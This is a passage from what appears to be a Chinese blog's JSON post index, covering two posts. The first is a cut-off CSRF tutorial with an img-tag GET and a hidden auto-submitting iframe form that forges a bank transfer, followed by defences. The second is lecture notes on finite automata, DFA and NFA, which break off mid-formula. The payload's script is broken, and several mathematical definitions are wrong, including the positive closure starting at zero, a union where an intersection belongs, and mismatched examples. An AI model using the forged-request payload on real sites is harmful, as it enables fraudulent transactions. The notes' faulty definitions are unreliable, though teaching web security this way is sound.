https://somebank.com/transfer?bankid=114514&amp;money=1919810</code>。被害人登录A后继续访问了B，B页面中有这样一串代码：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://somebank.com/transfer?bankid=114514&amp;money=1919810&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>浏览器会带上用”somebank.com”的Cookie执行这一请求，使得用户给卡号为114514的卡汇入了1919810元。</p>\n</li>\n<li><p>上个案例中A使用GET方法设计请求，违反了HTTP规范，于是他们改用POST。对于一些老的PHP实现的后台站点，如果获取参数采用的<code>$_REQUEST[&quot;bankdid&quot;]</code>这种方式，不区分GET和POST，照样能获得参数，所以POST还是没有起到作用。</p>\n</li>\n</ol>\n<p>假设后台实现区分了POST，危险站点B依然可以构造一个POST请求：<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">　　<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\">　　　　　　<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">steal</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            iframe = <span class=\"built_in\">document</span>.frames[<span class=\"string\">&quot;steal&quot;</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">            iframe.document.submit(<span class=\"string\">&quot;transfer&quot;</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">　　　　　　&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">　　　　</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">　　<span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;steal()&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://somebank.com&quot;</span>&gt;</span></span><br><span class=\"line\">　　　　<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;steal&quot;</span> <span class=\"attr\">display</span>=<span class=\"string\">&quot;none&quot;</span>&gt;</span></span><br><span class=\"line\">　　　　　　<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;transfer&quot;</span>　<span class=\"attr\">action</span>=<span class=\"string\">&quot;https://somebank.com/transfer&quot;</span>&gt;</span></span><br><span class=\"line\">　　　　　　　　<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;bankid&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;114514&quot;</span>&gt;</span></span><br><span class=\"line\">　　　　　　　　<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;money&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1919810&quot;</span>&gt;</span></span><br><span class=\"line\">　　　　　　<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">　　　　<span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>即使A站点不允许跨域，该处也可以用iframe构造一个同域的请求。</p>\n<h3 id=\"预防方式-2\"><a href=\"#预防方式-2\" class=\"headerlink\" title=\"预防方式\"></a>预防方式</h3><ul>\n<li>尽可能使用POST执行需要高安全性保障的接口</li>\n<li>将页面HTTP返回Header加上<code>X-Frame-Options: DENY</code>。</li>\n</ul>\n<blockquote>\n<p><code>X-Frame-Options</code>头部选项中，<code>DENY</code>是拒绝非同源页面引用该页面；<code>SAMEORIGIN</code>是允许被同源页面引用，<code>ALLOW-FROM uri</code>是允许被特定页面引用。</p>\n</blockquote>\n<ul>\n<li>设置页面HTTP返回头<code>Content-Security-Policy: script-src</code>。将设置外链js只能从本域名引用。</li>\n<li>对于支付等特别敏感的接口，强制使用验证码</li>\n<li>由于CSRF攻击中假设A站点是可信的，不存在A站点还有XSS漏洞，攻击者无法拿到A站点的Cookie。所以基于这一判断，可以对Cookie Hashing，让表单中包含一个<code>hash(cookie)</code>的<code>token</code>字段。服务器端接受表单请求的时候需要判断<code>hash(cookie) == token</code>才能继续执行，由于攻击者无法直接拿到Cookie，而且就算使用中间人攻击拿到了<code>token</code>也无法反推出<code>cookie</code>，这个方案可以彻底解决CSRF攻击。如果A页面也含有XSS漏洞，可以让攻击者拿到Cookie，可以让A页面的Cookie或者SESSION每次都变动，每次请求生成一个随机字段，并将改字段的hash渲染在form上，这样每次请求页面都会获取一个新的token，让攻击者几乎没有可能有时间伪造请求。</li>\n</ul>\n<blockquote>\n<p>参考资料：</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></li>\n</ul>\n</blockquote>\n","tags":["网络安全"]},{"title":"形式语言与自动机理论（1）有穷自动机","url":"/2021/01/22/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%881%EF%BC%89%E6%9C%89%E7%A9%B7%E8%87%AA%E5%8A%A8%E6%9C%BA/","content":"<h1 id=\"课程介绍\"><a href=\"#课程介绍\" class=\"headerlink\" title=\"课程介绍\"></a>课程介绍</h1><p>计算理论</p>\n<ul>\n<li>对计算本质的探索</li>\n<li>计算：非纯粹的算数，是一种以计算为有效的方式，获取答案的过程</li>\n<li>计算理论促进了计算机的发展，并随着计算机的诞生将重心转移到计算科学</li>\n</ul>\n<p>核心问题：<strong>计算机的<em>基本能力</em>和<em>限制</em>是什么？</strong><br>包含了两个方面：</p>\n<ul>\n<li>可计算性理论：有哪些问题可以通过计算来解决？计算这种能力是否有边界？如果不是，为什么不是？对于严谨的机械而有效的过程的研究，我们需要严格定义的概念（算法）去描述它，需要严谨的模型（自动机理论）去分析它。</li>\n<li>计算复杂性理论：利用计算去解决可计算的问题，需要消耗多少资源</li>\n</ul>\n<p>自动机理论：研究抽象机器及其所能解决的问题的理论，主要包括：</p>\n<ul>\n<li>图灵机</li>\n<li>有限状态机</li>\n<li>文法，下推自动机</li>\n</ul>\n<p>自动机是研究语言的模型，语言则是具体的实例。自动机以语言为处理对象，语言以自动机为形式定义，两者密不可分。</p>\n<p>形式语言：经数学定义的语言<br>语言：字符，单词，句子，语法</p>\n<p>课程内容：</p>\n<ul>\n<li>正则语言<ul>\n<li>有穷自动机</li>\n<li>正则表达式</li>\n<li>正则语言的性质</li>\n</ul>\n</li>\n<li>上下文无关语言<ul>\n<li>上下文无关文法</li>\n<li>下推自动机</li>\n<li>上下文无关语言的性质</li>\n</ul>\n</li>\n<li>计算导论<ul>\n<li>图灵机及其扩展</li>\n<li>不可判定性<span id=\"more\"></span>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h1><p>字母表：字符的<strong>非空有穷</strong>集<br>$\\Sigma_1=\\lbrace 0,1 \\rbrace $可以构建全部的二进制数，$\\Sigma_2=\\lbrace a,b,…,z \\rbrace$可以构建出各种英语字母组成的语言，$\\Sigma_3= \\lbrace x|x是汉字 \\rbrace$可以定义汉语。</p>\n<p>字符串：由字母表中某些符号组成的<strong>有穷</strong>序列</p>\n<p>空串：记为$\\epsilon$，有0个字符的字符串，对任何字母表，$\\epsilon\\notin\\Sigma$<br>$0,1,00,110100,…$称为字母表$\\Sigma_1=\\lbrace 0,1 \\rbrace $上的字符串</p>\n<p>符号约定：</p>\n<ul>\n<li>字母表：$\\Sigma,\\Gamma,…$</li>\n<li>字符：$a,b,c…$</li>\n<li>字符串：$…,w,x,y,z$</li>\n<li>集合：$A,B,C,…$</li>\n</ul>\n<p>字符串的长度：字符串$w$中符号所占位置的个数，计为$|w|$，递归定义：</p>\n<script type=\"math/tex; mode=display\">\n|w|=\n\\begin{cases}\n0 & \\text{$w=\\epsilon$}\\\\\n|x|+1 & \\text{$w=xa$}\\\\\n\\end{cases}</script><p>例：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n|0010| & = |001|+1\\\\\n & =|00|+1+1\\\\\n & =|0|+1+1+1\\\\\n & =|\\epsilon|+1+1+1+1\\\\\n & =0+1+1+1+1\\\\\n & =4\n\\end{aligned}</script><p>字符串的连接：将首尾相接得到新字符串的运算，记为$x·y$或$xy$，递归定义：</p>\n<script type=\"math/tex; mode=display\">\nx.y = \n\\begin{cases}\nx & \\text{$y=\\epsilon$}\\\\\n(x·z)a & \\text{$y=za$}\\\\\n\\end{cases}</script><p>其中</p>\n<script type=\"math/tex; mode=display\">\na\\in\\Sigma</script><p>，且$x,y,z$都是字符串<br>例：$x=01,y=ab$</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nxy & = 01·ab\\\\\n & = (01·a)b\\\\\n & = (01·\\epsilon)ab\\\\\n & = 01ab\n\\end{aligned}</script><p>满足结合律：$x·y·z=(x·y)·z=x·(y·z)$，不满足交换律：$x·y\\not=y·x$</p>\n<p>字符串$x$的$n$次幂$(n\\ge0)$，递归定义：</p>\n<script type=\"math/tex; mode=display\">\nx^n = \n\\begin{cases}\n\\epsilon & \\text{$n=0$}\\\\\nx^{n-1}x & \\text{$n\\gt0$}\\\\\n\\end{cases}</script><p>例1：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(ab)^2 & = (ab)^1·(ab)\\\\\n & = (ab)^0·abab\\\\\n & = \\epsilon abab\\\\\n & = abab\n\\end{aligned}</script><p>例2：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nab^2 & = ab^1·b\\\\\n & = ab^0bb\\\\\n & = a\\epsilon bb\\\\\n & = abb\n\\end{aligned}</script><p>集合$A$和集合$B$的连接，计为$A·B$或$AB$，定义为：$A·B=\\lbrace w | w = x·y, x \\in A \\text{且} y \\in B \\rbrace$<br>例：$A = \\lbrace 0,11 \\rbrace, B = \\lbrace ab,ba \\rbrace$</p>\n<script type=\"math/tex; mode=display\">\nAB = \\lbrace 0ab,0ba, 11ab, 11ba \\rbrace</script><p>集合运算不满足交换律$AB\\not=BA$</p>\n<p>集合$A$的$n$次幂$(n\\ge0)$，递归定义：</p>\n<script type=\"math/tex; mode=display\">\nA^n = \n\\begin{cases}\n\\lbrace\\epsilon\\rbrace & \\text{$n=0$}\\\\\nA^{n-1}A & \\text{$n\\ge1$}\\\\\n\\end{cases}</script><p>例：$A=\\lbrace \\epsilon \\rbrace$，</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA^3 & = AAA\\\\\n & = \\lbrace a \\rbrace \\lbrace a \\rbrace \\lbrace a \\rbrace \\\\\n & = \\lbrace a^3 \\rbrace \\\\\n & = \\lbrace aaa \\rbrace\n\\end{aligned}</script><p>即：若$\\Sigma$为字母表，则$\\Sigma^n$为$\\Sigma$上长度为$n$的字符串集合。<br>若$\\Sigma=\\lbrace 0,1 \\rbrace$，有：</p>\n<script type=\"math/tex; mode=display\">\n\\Sigma^0 = \\lbrace \\epsilon \\rbrace, \\Sigma^1 = \\lbrace 0,1 \\rbrace, \\Sigma^2 = \\lbrace 00,01,10,11 \\rbrace, \\\\\n\\Sigma^3 = \\lbrace 000,001,010,011,100,101,110,111 \\rbrace</script><p>克林闭包（Kleene Closure）</p>\n<script type=\"math/tex; mode=display\">\n\\Sigma^{\\ast} = \\bigcup_{\\text{$i=0$}}^\\infty \\Sigma^i</script><script type=\"math/tex; mode=display\">\nA^{\\ast} = \\bigcup_{\\text{$i=0$}}^\\infty A^i</script><p>正闭包（Positive Closure）</p>\n<script type=\"math/tex; mode=display\">\n\\Sigma^+ = \\bigcup_{\\text{$i=0$}}^\\infty \\Sigma^i</script><script type=\"math/tex; mode=display\">\nA^+ = \\bigcup_{\\text{$i=0$}}^\\infty A^i</script><p>显然：</p>\n<script type=\"math/tex; mode=display\">\n\\Sigma^{\\ast} = \\Sigma^+ \\cup \\lbrace \\epsilon \\rbrace</script><p>语言：<br>定义：若$\\Sigma$为字母表且$\\forall L \\subseteq \\Sigma^{\\ast}$，则$L$称为字母表$\\Sigma$上的语言。</p>\n<ul>\n<li>自然语言，程序设计语言等</li>\n<li>二进制01语言：$\\lbrace 0^n 1^n | n \\le 0 \\rbrace = \\lbrace \\epsilon,0,1,00,11,0101,… \\rbrace$</li>\n<li>$\\emptyset$, $\\lbrace \\epsilon \\rbrace$, 和$\\Sigma^{\\ast}$分别都是任意字母表$\\Sigma$上的语言，但是注意！：$\\emptyset \\not = \\lbrace \\epsilon \\rbrace$</li>\n</ul>\n<p>语言的唯一要求是：字母表是有穷的</p>\n<p>自动机器理论中的典型问题：判断给定的字符串$w$是否属于某个具体语言$L$，($w \\in L?$)</p>\n<p>语言和问题是相同的东西，任何问题可以转化为语言成员性问题，例如：“判断一个数是否是素数”中，素数是语言，参数是串。又如“判断一个C程序是否能被编译”，C语言是语言，程序是串。一部分问题是可以证明的，而一部分问题是无法证明的，如“图灵停机问题”</p>\n<p>形式化证明：<br>演绎法，归纳法和反证法<br>例1：若$x$和$y$是$\\Sigma$是$\\Sigma$上的字符串，请证明$|xy|=|x|+|y|$<br>证明：通过对$|y|$的归纳来证明（从$y$的长度归纳）：<br>基础：当$|y|=0$时，即$y=\\epsilon$,$|xy|=|x\\epsilon|=|x|=|x|+|\\epsilon|=|x|+|y|$<br>递推：假设$|y|=n (n \\ge 0)$时命题成立，那么当$|y|=n+1$时，即$y=wa$，$|xy|=|x(wa)|=|(xw)a|=|xw|+1=|x|+|w|+1=|x|+|wa|=|x|+|y|$</p>\n<p>也可通过对$y$的归纳来证明（从$y$的结构归纳）：<br>基础：当$y=\\epsilon$时，$|x\\epsilon|=|x|=|x|+|\\epsilon|=|x|+|y|$<br>地推：假设$y=w(w \\in \\Sigma^{\\ast})$时命题成立，那么当$y=wa$时，$|xy|=|x(wa)|=|xw|+1=|x|+|w|+1=|x|+|y|$</p>\n<h1 id=\"有穷自动机\"><a href=\"#有穷自动机\" class=\"headerlink\" title=\"有穷自动机\"></a>有穷自动机</h1><ul>\n<li>确定的有穷自动机<ul>\n<li>形式定义</li>\n<li>DFA的设计举例</li>\n<li>扩展转移函数与DFA的语言</li>\n</ul>\n</li>\n<li>非确定的有穷自动机</li>\n<li>带有空转移的非确定的有穷自动机</li>\n</ul>\n<p>有限状态机器（FSM，Finite State Machine），常见两种变形：Moore Machine，Mealy Machine，应用于数字电路设计，AI设计，通讯协议设计，文本搜索与识别</p>\n<p>确定的有穷自动机：</p>\n<ul>\n<li>一条输入带：每个空格存储一个字符</li>\n<li>一个读头：左右移动，每次移动读取一格</li>\n<li>一个有穷控制器：有限个状态，能存储当前状态，能根据当前的状态和读头读数进行状态的改变</li>\n</ul>\n<p>起初读头在输入带第一个字符，从左向右读，并改变自己的状态，不断循环这一过程，直到读完最后一个字符串，完成这一过程。根据有穷控制器自身的状态对这个字符串判断，得到两种结果：接受或拒绝</p>\n<p>例子：用有穷自动机识别$\\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} | w \\text{的长度} |w| \\text{是偶数.} \\rbrace$</p>\n<p>确定的有穷自动机的形式（DFA，Deterministic Finite Automation）定义：<br>A为五元组：</p>\n<script type=\"math/tex; mode=display\">\nA=(Q,\\Sigma,\\delta,q_0,F)</script><ul>\n<li>$Q$：有穷状态集</li>\n<li>$\\Sigma$：有穷输入符号集/字母表</li>\n<li>$\\delta:Q × \\Sigma → Q$，状态转移函数</li>\n<li>$q_0 \\in Q$：初始状态</li>\n<li>$F \\subseteq Q$：终结状态集或接受状态集<br>对于某一状态$q$，此刻读头读取字符为$a$，下一刻跳转的状态$p$是确定的：$p=\\delta(q,a)$</li>\n</ul>\n<p>例：设计一个DFA，在任何由0和1构成从串中，接受含有01字串的全部串。</p>\n<ul>\n<li>$q_1$：未发现01，即使0都没出现过</li>\n<li>$q_2$：未发现01，但上一次读入字符是0</li>\n<li>$q_3$：已经发现了01<br>该DFA可以定义为：</li>\n</ul>\n<script type=\"math/tex; mode=display\">\n= (\\lbrace q_1,q_2,q_3 \\rbrace, \\lbrace 0,1 \\rbrace, \\delta, q_1, \\lbrace q_3 \\rbrace)</script><p>其中$\\delta$为：</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q_1,1)=q_1 \\ \\ \\delta(q_1,0)=q_2</script><script type=\"math/tex; mode=display\">\n\\delta(q_2,1)=q_3 \\ \\ \\delta(q_2,0)=q_2</script><script type=\"math/tex; mode=display\">\n\\delta(q_3,1)=q_3 \\ \\ \\delta(q_3,0)=q_3</script><p>状态转移图：</p>\n<ul>\n<li>每个状态$q$对应一个节点，用圆圈表示</li>\n<li>状态转移函数$\\delta(q,a)=p$为一条从$q$到$p$且标记为字符$a$的有向边</li>\n<li>开始状态$q_0$用一个标有start的箭头表示</li>\n<li>接受状态的节点，用双圆圈表示<img src=\"1.png\" alt=\"\"></li>\n</ul>\n<p>状态转移表：</p>\n<ul>\n<li>每个状态$q$对应一行，每个字符$a$对应一列</li>\n<li>若有$\\delta(q,a)=p$，用第$q$行第$a$列中填入的$p$表示</li>\n<li>开始状态$q_0$前，标记箭头 → 表示</li>\n<li>接受状态$q \\in F$前，标记星号*表示</li>\n</ul>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$→q_1$</td>\n<td>$q_2$</td>\n<td>$q_1$</td>\n</tr>\n<tr>\n<td>$q_2$</td>\n<td>$q_2$</td>\n<td>$q_3$</td>\n</tr>\n<tr>\n<td>$*q_3$</td>\n<td>$q_3$</td>\n<td>$q_3$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>例2：若$\\Sigma=\\lbrace 0,1 \\rbrace$,给出接受全部含有奇数个1的串DFA。</p>\n<p>有两个状态：偶数个1和奇数个1，首先画出状态转移图：<br><img src=\"2.png\" alt=\"\"><br>对应的形式化定义为：</p>\n<script type=\"math/tex; mode=display\">\nA = (\\lbrace q_1,q_2 \\rbrace, \\lbrace 0,1 \\rbrace, \\delta, q_1, \\lbrace q_2 \\rbrace)</script><p>其中$\\delta$为：</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q_1,1)=q_2 \\ \\ \\delta(q_1,0)=q_1</script><script type=\"math/tex; mode=display\">\n\\delta(q_2,1)=q_1 \\ \\ \\delta(q_2,0)=q_2</script><p>例3：若$\\Sigma=\\lbrace 0,1 \\rbrace$,给出接受全部含有偶数个0和偶数个1的串的DFA</p>\n<p>首先画出“接受偶数个0的状态转移图”<br><img src=\"3.png\" alt=\"\"></p>\n<p>再画出“接受偶数个1的状态转移图”<br><img src=\"4.png\" alt=\"\"></p>\n<p>将两个DFA的两种状态分别记为$a,b$和$m,n$，然后做笛卡尔积<br><img src=\"5.png\" alt=\"\"></p>\n<p>两个状态的DFA与两个状态的DFA做笛卡尔积，有四个状态，新的DFA如下<br><img src=\"6.png\" alt=\"\"><br>其中$q_0=am$，$q_1=bm$，$q_2=an$，$q_3=bn$</p>\n<p>扩展转移函数：<br>扩展$\\delta$到字符串，定义扩展转移函数：$\\hat \\delta : Q × \\Sigma^{\\ast} → Q $为：</p>\n<script type=\"math/tex; mode=display\">\n\\hat \\delta (q,w) = \n\\begin{cases}\nq & \\text{$w=\\epsilon$}\\\\\n\\delta (\\hat \\delta(q,x) , a) & \\text{$w=xa$}\\\\\n\\end{cases}</script><p>其中$a \\in \\Sigma, \\ w,x \\in \\Sigma^{\\ast}$，那么，当$w=a_0 a_1 … a_n$，则有：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{align}\n\\hat \\delta(q,w) & = \\delta( \\hat \\delta (q,a_0a_1,...a_n),a) \\\\\n & = \\delta(\\delta(\\hat\\delta (q,a_0a_1...a_{n-1}),a_n),a) \\\\\n & = \\delta(\\delta(...\\delta(\\hat\\delta(q,\\epsilon),a_0)...,a_{n-1}),a_n) \\\\\n & = \\delta(\\delta(...\\delta(q,a_0)...,a_{n-1}),a_n)\n\\end{align}</script><p>例：接受全部含有01子串的DFA，$\\hat\\delta$处理串0101的过程：<br>状态转移图如下：<br><img src=\"7.png\" alt=\"\"></p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\hat\\delta(q_0,0101) & = \\delta( \\hat \\delta (q_0,010),1) \\\\\n & = \\delta(\\delta(\\hat\\delta (q_0,01),0),1) \\\\\n & = \\delta(\\delta(\\delta(\\hat\\delta(q_0,0),1),0),1) \\\\\n & = \\delta(\\delta(\\delta(\\delta(\\hat\\delta(q_0,\\epsilon),0),1),0),1) \\\\\n & = \\delta(\\delta(\\delta(\\delta(q_0,0),1),0),1) \\\\\n & = q_2\n\\end{aligned}</script><p>DFA的扩展转移函数$\\hat\\delta$在任意特定状态$q$接受特定字符串$w$结束状态都是<strong>确定</strong>的</p>\n<p>例：对任何状态$q$及字符串$x$和$y$，证明$\\hat\\delta(q,xy)=\\hat\\delta(\\hat\\delta(q,x),y)$<br>证明：对$y$使用归纳法：<br>当$y=\\epsilon$，$\\hat\\delta(\\hat\\delta(q,x),\\epsilon) = \\hat\\delta(q,x) = \\hat\\delta(q,x\\epsilon)$<br>当$y=wa$时，$\\hat\\delta(q,xwa)=\\delta(\\hat\\delta(q,xw),a)=\\delta(\\hat\\delta(\\hat\\delta(q,x),w),a) = \\hat\\delta(\\hat\\delta(q,x),wa)$</p>\n<p>若$D = (Q, \\Sigma, \\delta, q_0, F)$是一个DFA，则$D$接受的语言为：</p>\n<script type=\"math/tex; mode=display\">\nL(D) = \\lbrace w \\in \\Sigma^{\\ast} | \\hat\\delta(q_0,w) \\in F \\rbrace</script><p>DFA可以作为语言的识别器，也可以用来定义语言。如果语言$L$是某个DFA $D$的语言，即$L = L(D)$，则称$L$是正则语言。</p>\n<ul>\n<li>$\\emptyset$和$\\lbrace \\epsilon \\rbrace$都是正则语言</li>\n<li>若$\\Sigma$是字母表，$\\Sigma^n$，$\\Sigma^{\\ast}$都是$\\Sigma$上的正则语言。</li>\n</ul>\n<p>例：设计DFA接受$\\lbrace 0,1 \\rbrace$上的字符串$w$,且$w$是3的倍数的二进制数<br>分析：读入一个0，相当于乘2；读入一个1，相当于乘2加1。根据除3取余结果有三种状态：$q_0=3k,q_1=3k+1,q_2=2k+2 (k \\in N)$，根据此画出状态转移表：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$q_0$</td>\n<td>$q_0$</td>\n<td>$q_1$</td>\n</tr>\n<tr>\n<td>$q_1$</td>\n<td>$q_2$</td>\n<td>$q_0$</td>\n</tr>\n<tr>\n<td>$q_2$</td>\n<td>$q_1$</td>\n<td>$q_2$</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>如果把开始状态设为$q_0$，终结状态也是$q_0$，那么该DFA会接受$\\epsilon$，而且该DFA还会接受0开头的非零二进制数。为了防止这两种情况，引入开始状态$q_s$和为串以0开头的状态，一旦串以0开头，在接受字符，它将被“stuck”。对应的状态转移图如下：<br><img src=\"8.png\" alt=\"\"></p>\n<p>非确定的有穷自动机</p>\n<ul>\n<li>确定的有穷自动机</li>\n<li>非确定的有穷自动机</li>\n<li>形式语言</li>\n<li>扩展转移函数与NFA的语言</li>\n<li>DFA与NFA的等价性</li>\n<li>带有空转移的非确定的有穷自动机</li>\n</ul>\n<p>例：由0和1构成的串中，接受全部以01结尾的串，如何设计DFA<br>DFA如下<br><img src=\"9.png\" alt=\"\"></p>\n<p>但是，这样的设计，实际上过于繁琐。</p>\n<p>状态的非确定性转移：<br><img src=\"10.png\" alt=\"\"></p>\n<ul>\n<li>同一个状态在相同输入下，可以有多个转移状态</li>\n<li>自动机可以处在多个当前状态</li>\n<li>使得自动机的设计更容易</li>\n</ul>\n<p>上述问题对应的非确定性状态转移图如下:<br><img src=\"11.png\" alt=\"\"></p>\n<p>非确定性有穷自动机（Nondeterministic Finite Automation，NFA）A为五元组：</p>\n<script type=\"math/tex; mode=display\">\nA=(Q,\\Sigma,\\delta,q_0,F)</script><ul>\n<li>$Q$：有穷状态集</li>\n<li>$\\Sigma$：有穷输入符号集/字母表</li>\n<li>$\\delta:Q × \\Sigma → 2^Q$，状态转移函数  $(2^Q=\\lbrace S | S \\subseteq Q \\rbrace)$ 从一个状态可以跳转到多个状态</li>\n<li>$q_0 \\in Q$：初始状态</li>\n<li>$F \\subseteq Q$：终结状态集或接受状态集</li>\n</ul>\n<p>例：由0和1构成的串中，接受全部以01结尾的串，设计NFA</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<p>五元组为$A=(\\lbrace q_0,q_1,q_2 \\rbrace. \\lbrace 0,1 \\rbrace. \\epsilon. q_0, \\lbrace q_2 \\rbrace)$,转移函数</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q_0,0)=\\lbrace q_0,q_1 \\rbrace  \\ \\ \\delta(q_1,0)=\\emptyset \\ \\ \\delta(q_2,0)=\\emptyset \\\\\n\\delta(q_0,1)=\\lbrace q_0 \\rbrace  \\ \\ \\delta(q_1,1)=\\lbrace q_2 \\rbrace \\ \\ \\delta(q_2,1)=\\emptyset</script><p>在DFA中，$\\delta$函数 的返回值不再是一个状态，而是一个集合:$\\delta(q_1,0)=\\lbrace q_2 \\rbrace $</p>\n<p>当一个未定义的动作发送，返回也不再是$\\epsilon$而是$\\emptyset$:$\\delta(q_2,0)=\\emptyset$</p>\n<p>对于NFA，只要有一条路径可以接受串，就可以接受该串：<img src=\"11.png\" alt=\"\"></p>\n<p>也可将NFA的执行过程理解成操作系统中的 <code>fork()</code></p>\n<p>NFA的状态转移表：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>$\\to q_0$</td>\n<td>$\\lbrace q_0,q_1 \\rbrace$</td>\n<td>$\\lbrace q_0 \\rbrace$</td>\n</tr>\n<tr>\n<td>$q_1$</td>\n<td>$\\emptyset$</td>\n<td>$\\lbrace q_2 \\rbrace $</td>\n</tr>\n<tr>\n<td>$* q_2$</td>\n<td>$\\emptyset$</td>\n<td>$\\emptyset$</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>NFA的扩展转移函数：</p>\n<p>定义：扩展$\\delta$到字符串，定义扩展转移函数$\\hat\\delta : Q × \\Sigma^{\\ast} → 2^Q$为：</p>\n<script type=\"math/tex; mode=display\">\n\\hat\\delta(q,w) =\n\\begin{cases}\n\\lbrace q \\rbrace & w = \\epsilon \\\\\n\\bigcup_{p \\in \\hat\\delta(q,x)} \\delta(p,a) & w = xa\n\\end{cases}</script><p>其中$a \\in \\Sigma, \\ w,x \\in \\Sigma^{\\ast}$</p>\n<p>NFA接受的语言：</p>\n<p>定义：若$N = (Q, \\Sigma, \\delta, q_0, F)$是一个NFA，那么$N$接受的语言为</p>\n<script type=\"math/tex; mode=display\">\nL(N) = \\lbrace w \\in \\Sigma^{\\ast} | \\hat\\delta(q_0,w) \\cup F \\rbrace \\not= \\emptyset \\rbrace</script><p>例：$L=\\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} | w \\text{的首尾字符相同} \\rbrace$的NFA</p>\n<p>开头为0则结尾是0，开头是1则结尾也是1。特殊考虑空串的情况下，接受$\\epsilon$，可以轻易的画出对应的NFA状态转移图：</p>\n<p><img src=\"12.png\" alt=\"\"></p>\n<p>例：$L=\\lbrace w \\in \\lbrace 0,1 \\rbrace^{\\ast} | w \\text{ either begin or ends with 01} \\rbrace $的NFA</p>\n<p><img src=\"13.png\" alt=\"\"></p>\n<p>DFA与NFA的等价性：</p>\n<p>定理1：如果语言$L$被NFA接受，当且仅当$L$被DFA接受</p>\n<p>一个DFA的语言，构造识别他的NFA，把转移函数改为返回单值集合的对应DFA转移函数即可；</p>\n<p>一个NFA语言，要构造识别他的DFA，使用子集构造法：</p>\n<p>如果NFA $N = (Q_N, \\Sigma, \\delta_N, q_0, F_N)$，构造DFA：$D = (Q_D, \\Sigma, \\delta_D, \\lbrace q_0 \\rbrace, F_D)$：</p>\n<ul>\n<li>$Q_D = 2^{Q_N}$，即$\\lbrace S | S \\in Q_N \\rbrace $</li>\n<li>$F_D = \\lbrace S | S \\subseteq Q_N, S \\cap F_N \\not= \\emptyset \\rbrace$</li>\n<li>$\\forall S \\subseteq Q_N, \\ \\forall a \\in \\Sigma$：</li>\n</ul>\n<script type=\"math/tex; mode=display\">\n\\delta_D(S,a) = \\bigcup_{p \\in S} \\delta_N(p,a)</script><p>那么有$L(D)= 